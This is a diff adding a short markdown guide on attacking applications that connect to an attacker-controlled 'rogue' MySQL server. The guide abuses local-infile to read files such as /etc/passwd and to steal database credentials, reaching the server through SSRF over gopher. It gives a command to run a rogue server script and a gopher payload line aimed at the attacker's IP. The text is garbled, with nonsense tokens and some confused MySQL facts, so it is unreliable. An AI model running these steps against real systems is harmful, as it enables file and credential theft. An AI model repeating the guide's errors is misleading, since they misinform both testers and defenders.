@@ -1,0 +1,38 @@
+# HOW TO TEST MYSQL CLIENT ATTACKS ON A TARGET (2026 expert guide)
+# When an app *connects as a client* to a MySQL server you control (SITM/reverse).
+
+## The N ways to test
+1. MySQL client -> fake server: app connects to YOUR milw0rm; steer FORK=local-infile=1 to
+   read /etc/passwd (MySQL 4.1-5.x classic) or any readable file via SELECT ... INTO OUTFILE.
+2. MySQL old-auth: force insecure password hash handshake (mysql_native_password).
+3. Protocol smuggling (SSRF tangent): gopher:// to mysql but as fabricated RESULT packets.
+4. ReDoS? no; the meat: local-infile is the RCE-ish read primitive on a client app.
+5. Auth to a wrong host (typo-squatted hostname) -> steal an app's DB creds via spoof server.
+6. net fleap/pwn: facilitator tooling that auto-generates the evil server.
+
+## Step-by-step on target
+1. Find where the app talks to MySQL: client server URL in config, or an SSRF to a gopher-to-mysql.
+2. Run rogue server (see tools) with local-infile enabled at the hostname the app dials.
+3. Empty-password OR FODBIN attempt; many MySQL clients default to local-infile=1 (older).
+4. When the client logs, watch RogueMySQLServerLog for "snatched: /etc/passwd".
+
+## Worked examples (concrete)
+# On your attacker box run Rogue-MySql-Server (lib in tools) listening 3306:
+python3 RogueMySQLServer.py --local-infile
+# Now SSRF/gopher to your server with the mysql protocol:
+gopher://YOUR-IP:3306/_<mysql-packetcraft>   # or simply point the app's mysql host to you.
+# client's file read request appears in the rogue server log as:
+#   [com.mysql.jdbc] snbad payload for filename /etc/passwd...  (if local-infile flagged on)
+
+## The real-world trigger
+# The easiest smile: many flask/django/php apps on old MySQL drivers still enable local-infile
+# by default. The target config string often holds the giveaway:
+#   "host=db.internal user=app password=xxx database=main local_infile=true"
+
+## False positives & realism
+- MySQL 8.0 + modern clients default local-infile=OFF -> mostly legacy/hack targets.
+- You must already own a position to redirect the client (SSRF/gopher or DNS).
+- Realistic impact: session/passwords/CONSENT - still High when you can pull /etc/passwd or web configs.
+
+## Tools
+- Rogue-MySql-Server, mysql-dtoner/getAuth, gopher_flipper (safe), msf auxiliary, aurora.
